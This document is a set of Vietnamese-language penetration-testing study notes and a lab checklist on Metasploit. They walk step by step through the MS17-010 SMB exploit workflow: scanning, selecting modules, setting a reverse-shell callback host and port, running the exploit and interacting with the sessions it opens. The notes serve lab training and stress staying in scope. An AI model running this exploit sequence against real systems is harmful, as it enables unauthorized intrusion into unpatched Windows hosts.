# Metasploit Modules

## Ý chính

Metasploit module là code/script được chuẩn bị sẵn để scan, exploit, deliver payload hoặc thực hiện post-exploitation.

Exploit Metasploit thất bại không chứng minh vulnerability không tồn tại. Có thể module không phù hợp target, sai cấu hình, sai payload, sai architecture hoặc callback bị chặn.

## Cấu trúc module

```text
<type>/<os>/<service>/<name>
```

Ví dụ:

```text
exploit/windows/smb/ms17_010_psexec
```

## Module Types

- `auxiliary`: scanner, enumeration, fuzzing, sniffing, brute-force.
    
- `exploit`: khai thác vulnerability và tạo điều kiện chạy payload.
    
- `payload`: code chạy trên target sau khi exploit thành công.
    
- `encoder`: biến đổi payload, xử lý bad characters/format.
    
- `nop`: No Operation, điều chỉnh payload hoặc memory layout.
    
- `post`: thu thập thông tin và post-exploitation.
    
- `plugin`: mở rộng chức năng Metasploit.
    

## Tìm module

```text
search ms17_010
search eternalromance type:exploit
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

Các filter thường dùng:

- `type:`
    
- `platform:`
    
- `cve:`
    
- `port:`
    
- `rank:`
    
- `name:`
    
- `check:`
    
- `arch:`
    

Không ghi nhớ index number vì số module thay đổi theo từng kết quả search.

## Chọn và đọc module

```text
use exploit/windows/smb/ms17_010_psexec
show options
info
```

- `show options`: xem cấu hình.
    
- `info`: xem mô tả, target, architecture, CVE, rank và cơ chế exploit.
    

## Target Options

```text
set RHOSTS 10.10.10.40
set RPORT 445
```

- `RHOSTS`: target.
    
- `RPORT`: port dịch vụ trên target.
    

## Payload Options

```text
set LHOST 10.10.14.15
set LPORT 4444
```

- `LHOST`: IP attack box mà reverse payload callback về.
    
- `LPORT`: port listener trên attack box.
    

Trong HTB, `LHOST` thường là IP của `tun0`.

## Local vs Global Options

```text
set RHOSTS 10.10.10.40
setg LHOST 10.10.14.15
```

- `set`: áp dụng cho module hiện tại.
    
- `setg`: áp dụng global trong phiên msfconsole.
    
- Cần kiểm tra/xóa global option khi chuyển target.
    

```text
getg RHOSTS
unsetg RHOSTS
```

## Kiểm tra và chạy

```text
check
run
```

- `check`: kiểm tra khả năng target vulnerable nếu module hỗ trợ.
    
- `run` hoặc `exploit`: chạy module.
    

## MS17-010 Workflow

```text
nmap -sV <TARGET>
search ms17_010
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET>
run
```

Nếu có bằng chứng target vulnerable và trong phạm vi lab:

```text
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <TARGET>
set LHOST <TUN0_IP>
show options
check
run
```

## Exploit vs Payload

```text
Exploit = lợi dụng vulnerability
Payload = code chạy sau khi exploit thành công
Handler = listener nhận reverse connection
Session = kênh tương tác sau khai thác
```

## Ghi nhớ

- Port 445 mở không có nghĩa target chắc chắn bị MS17-010.
    
- `check` không phải bằng chứng tuyệt đối.
    
- Rank cao không đảm bảo exploit an toàn hoặc thành công.
    
- Luôn đọc `info` và `show options`.
    
- Metasploit là công cụ hỗ trợ, không thay thế kiểm tra thủ công.

---
# Checklist làm lab

## Giai đoạn 1: Enumeration

- [ ]  Xác định đúng target IP.
- [ ]  Xác nhận target thuộc scope.
- [ ]  Scan port và service:

```
nmap -sC -sV -p- <TARGET>
```

- [ ]  Kiểm tra port `445`.
- [ ]  Xác định OS và SMB version nếu có thể.
- [ ]  Không kết luận MS17-010 chỉ vì port 445 mở.
- [ ]  Lưu kết quả scan.

---

## Giai đoạn 2: Tìm module

- [ ]  Khởi động:

```
msfconsole
```

- [ ]  Tìm theo vulnerability:

```
search ms17_010
```

- [ ]  Phân biệt scanner, exploit và command module.
- [ ]  Chọn module bằng path thay vì chỉ nhớ index.
- [ ]  Xác minh module phù hợp target OS và architecture.

---

## Giai đoạn 3: Đọc module

- [ ]  Chạy:

```
info
```

- [ ]  Đọc description.
- [ ]  Đọc references/CVE.
- [ ]  Kiểm tra supported targets.
- [ ]  Kiểm tra architecture.
- [ ]  Kiểm tra rank.
- [ ]  Kiểm tra `Check supported`.
- [ ]  Kiểm tra module có yêu cầu named pipe không.
- [ ]  Kiểm tra module có thể làm crash target không.

---

## Giai đoạn 4: Kiểm tra vulnerability

- [ ]  Ưu tiên scanner:

```
use auxiliary/scanner/smb/smb_ms17_010
```

- [ ]  Đặt target:

```
set RHOSTS <TARGET>
```

- [ ]  Xem lại:

```
show options
```

- [ ]  Chạy scanner:

```
run
```

- [ ]  Lưu output.
- [ ]  Không coi một kết quả scanner là bằng chứng tuyệt đối.
- [ ]  Correlate với OS/version/patch information.

---

## Giai đoạn 5: Cấu hình exploit

- [ ]  Chọn exploit phù hợp:

```
use exploit/windows/smb/ms17_010_psexec
```

- [ ]  Đặt:

```
set RHOSTS <TARGET>
set RPORT 445
```

- [ ]  Kiểm tra IP VPN:

```
ip addr show tun0
```

- [ ]  Đặt callback:

```
set LHOST <TUN0_IP>
set LPORT 4444
```

- [ ]  Xem payload hiện tại:

```
show payloads
show options
```

- [ ]  Xác minh architecture của payload.
- [ ]  Kiểm tra không còn global option của target trước.

---

## Giai đoạn 6: Chạy có kiểm soát

- [ ]  Dùng `check` nếu module hỗ trợ:

```
check
```

- [ ]  Đọc lại tất cả option.
- [ ]  Chỉ chạy khi đúng lab/scope.
- [ ]  Chạy:

```
run
```

- [ ]  Quan sát handler.
- [ ]  Quan sát vulnerability check.
- [ ]  Ghi lại lỗi nếu exploit thất bại.
- [ ]  Không spam exploit liên tục nếu target có nguy cơ crash.

---

## Giai đoạn 7: Sau khi có session

- [ ]  Kiểm tra sessions:

```
sessions
```

- [ ]  Tương tác với session phù hợp:

```
sessions -i <ID>
```

- [ ]  Kiểm tra user:

```
whoami
```

- [ ]  Kiểm tra hostname:

```
hostname
```

- [ ]  Kiểm tra OS:

```
systeminfo
```

- [ ]  Xác định session là shell hay Meterpreter.
- [ ]  Chỉ thực hiện các bước được lab yêu cầu.
- [ ]  Thu thập flag/evidence cần thiết.
- [ ]  Ghi lại attack path.

---

## Khi exploit thất bại

- [ ]  Kiểm tra lại `RHOSTS`.
- [ ]  Kiểm tra `RPORT`.
- [ ]  Kiểm tra `LHOST` có phải IP `tun0` không.
- [ ]  Kiểm tra target có route về attack box không.
- [ ]  Kiểm tra VPN.
- [ ]  Kiểm tra architecture.
- [ ]  Thử `check`.
- [ ]  Đọc `info`.
- [ ]  Kiểm tra module target mode.
- [ ]  Kiểm tra payload có tương thích không.
- [ ]  Kiểm tra firewall/outbound connection.
- [ ]  Không kết luận target không vulnerable chỉ vì module thất bại.